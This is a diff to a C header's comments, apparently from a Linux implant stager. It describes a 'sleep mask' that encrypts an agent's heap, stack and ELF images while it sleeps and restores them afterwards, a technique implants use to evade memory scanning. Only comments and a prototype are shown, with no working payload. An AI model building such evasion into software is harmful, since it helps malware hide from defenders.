@@ -15,14 +15,15 @@
  * reads it at startup. The agent must have stopped or joined every other
  * thread first: this function masks in place and does not suspend the caller.
  *
- * The agent passes an address inside its own mapping (a probe, currently
- * informational) and the sleep duration. The wrapper switches to the stager's
- * dedicated mask stack and calls the provider. The default provider encrypts
- * agent-owned memory (anonymous ELF images, [heap], [stack]), sleeps, restores
- * it and returns. Runtime TLS/libc/stager mappings and the stub's state/stack
+ * The agent reports its stack pointer and readiness in the published ABI block
+ * before each call. The wrapper switches to the stager's dedicated mask stack
+ * and calls the provider. The default provider encrypts agent-owned memory
+ * (anonymous ELF images, [heap], the live part of the agent stack), sleeps,
+ * restores it and returns. The unused part of the stack mapping is dropped
+ * instead of encrypted, so a large loader-allocated stack does not inflate the
+ * mask window. Runtime TLS/libc/stager mappings and the stub's state/stack
  * remain usable while the agent is masked.
  */
-typedef int (*stager_mask_fn)(unsigned seconds, uintptr_t probe);
 
 /* Publish the mask entry point in the stager state block (mask.c). */
 void stager_mask_publish(void);
@@ -39,9 +40,11 @@ int stager_mask_run_on_stack(unsigned seconds, uintptr_t probe, void *stack_top,
 /*
  * Provider contract (mask_<name>.c, selected with MASK=<name>):
  * mask the chosen agent-owned ranges except `keep_start..keep_end`, sleep, and
- * restore them. Runs on the dedicated stub stack, so it may mask the agent's
- * stack. The provider is free to mmap its own scratch. 0 on success. The common
- * wrapper in mask.c discards the spent payload blob first.
+ * restore them. `probe` is the stack pointer from the agent's published mask
+ * report; a provider that masks the stack can use it to bound the live frames.
+ * Runs on the dedicated stub stack, so it may mask the agent's stack. The
+ * provider is free to mmap its own scratch. 0 on success. The common wrapper
+ * drops the spent payload blob once the agent reports ready.
  *
  * A minimal provider can simply sleep:
  *
